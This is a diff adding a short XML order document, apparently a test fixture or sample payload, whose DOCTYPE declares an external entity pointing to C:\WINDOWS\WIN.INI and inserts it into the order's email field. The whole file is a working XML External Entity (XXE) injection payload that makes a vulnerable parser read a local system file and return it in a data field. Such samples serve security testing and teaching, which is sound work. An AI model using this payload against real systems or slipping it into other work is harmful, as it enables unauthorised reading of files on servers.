@@ -1,0 +1,8 @@
+﻿<?xml version="1.0"?>
+<!DOCTYPE order[
+	<!ENTITY name SYSTEM 'C:\WINDOWS\WIN.INI'>
+]>
+<order>
+	<order_id>5e82da5d47ff063da0d6c3b5</order_id>
+	<email>&name;</email>
+</order>
